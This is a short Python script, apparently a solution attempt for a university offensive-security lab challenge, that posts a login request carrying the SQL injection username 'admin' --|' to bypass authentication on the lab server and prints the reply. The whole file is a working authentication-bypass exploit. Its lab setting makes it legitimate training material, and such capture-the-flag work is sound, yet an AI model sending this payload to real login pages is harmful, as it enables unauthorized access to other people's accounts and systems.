import requests

def send_login_request(origin, referer, user_id, payload, allow_redirects=True):
    """
    Sends a login request to the specified origin with the given parameters.

    :param origin: The base URL of the target server
    :param referer: The referer URL
    :param user_id: The CHALBROKER_USER_ID cookie value
    :param payload: The payload for the POST request (dictionary)
    :param allow_redirects: Whether to allow redirects (default: True)
    :return: The response object from the request
    """
    # Define the URL
    url = f"{origin}/login"

    # Define the headers
    headers = {
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": origin,
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": referer,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    # Define the cookies
    cookies = {
        "CHALBROKER_USER_ID": user_id
    }

    # Send the POST request
    response = requests.post(url, data=payload, headers=headers, cookies=cookies, allow_redirects=allow_redirects)

    return response

# Example usage
if __name__ == "__main__":
    ORIGIN = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1504"
    REFERER = f"{ORIGIN}/login"
    CHALBROKER_USER_ID = "nam10102"
    PAYLOAD = {
        "username": "admin' --|",
        "password": "ttttt"
    }

    response = send_login_request(ORIGIN, REFERER, CHALBROKER_USER_ID, PAYLOAD)
    print(response.status_code)
    print(response.text)